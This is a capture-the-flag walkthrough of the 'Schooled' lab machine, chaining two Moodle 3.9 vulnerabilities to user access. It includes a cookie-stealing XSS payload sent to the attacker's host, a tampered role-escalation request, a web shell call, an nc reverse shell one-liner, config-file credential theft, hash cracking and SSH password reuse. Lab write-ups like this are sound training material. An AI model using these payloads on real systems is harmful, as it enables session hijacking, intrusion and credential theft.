## Overview

Schooled is a medium-difficulty FreeBSD machine centered on a Moodle learning platform. The path to the user flag chains two Moodle vulnerabilities — a stored XSS that hijacks a teacher account (CVE-2020-25627) and a broken-access-control flaw that escalates a teacher to manager (CVE-2020-14321) — to install a malicious plugin and gain code execution as the web user. From there, the Moodle config file leaks database credentials, the admin's password hash cracks, and that password is reused for SSH as the local user `jamie`.

```bash
nmap -p- --min-rate 1000 -T4 10.10.10.234
nmap -sC -sV -p22,80,33060 10.10.10.234
```

The landing page references the domain `schooled.htb`. Fuzzing virtual hosts reveals a Moodle portal on a subdomain.

## Enumeration

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.schooled.htb" --hh 20750 http://10.10.10.234
# -> moodle.schooled.htb
```

Add the vhost to `/etc/hosts` and browse `http://moodle.schooled.htb/moodle/`. The version is exposed at `/moodle/lib/upgrade.txt` — **Moodle 3.9**, which is affected by both CVE-2020-25627 (stored XSS) and CVE-2020-14321 (teacher→manager privilege escalation). Registration requires an `@student.schooled.htb` email, and the **Mathematics** course allows self-enrolment with no key.

## Foothold

After self-enrolling, the course announcements note that the teacher personally reviews every student's MoodleNet profile — the perfect trigger for a stored XSS.

**1. Steal the teacher's session (CVE-2020-25627).** Set the MoodleNet profile field to a cookie-stealer and wait for the teacher to view it:

```text
<script>document.location="http://<lhost>:8000/?"+document.cookie</script>
```
```bash
nc -lnvp 8000   # teacher's MoodleSession cookie arrives shortly
```

Replace your `MoodleSession` cookie with the captured value to log in as the teacher, **Manuel Phillips**.

**2. Escalate teacher → manager (CVE-2020-14321).** Enrol the known manager (Lianne Carter) into the course, then intercept the enrolment request and tamper it to assign the **manager** role to your own user id:

```text
userlist=<your_user_id>&roletoassign=1
```

Use *Log in as* on the manager's profile to reach **Site administration**, then follow the public PoC to re-enable **Install plugins** by editing the Manager role definition.

**3. Plugin RCE.** Install a malicious plugin that ships a web shell, then execute commands as the web user:

```bash
curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
# URL-encoded reverse shell to a listener on 7777:
#   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 7777 >/tmp/f
/usr/local/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**4. Database credentials → SSH.** The Moodle config file holds the DB password; dump the user table, crack the admin hash, and reuse it for SSH:

```bash
cat /usr/local/www/apache24/data/moodle/config.php          # moodle:<redacted>
/usr/local/bin/mysql -u moodle -p<redacted> moodle -e "select username,password from mdl_user;"
john --wordlist=/usr/share/wordlists/rockyou.txt hash       # cracks the admin bcrypt
sshpass -p '<redacted>' ssh jamie@10.10.10.234              # password reuse
```
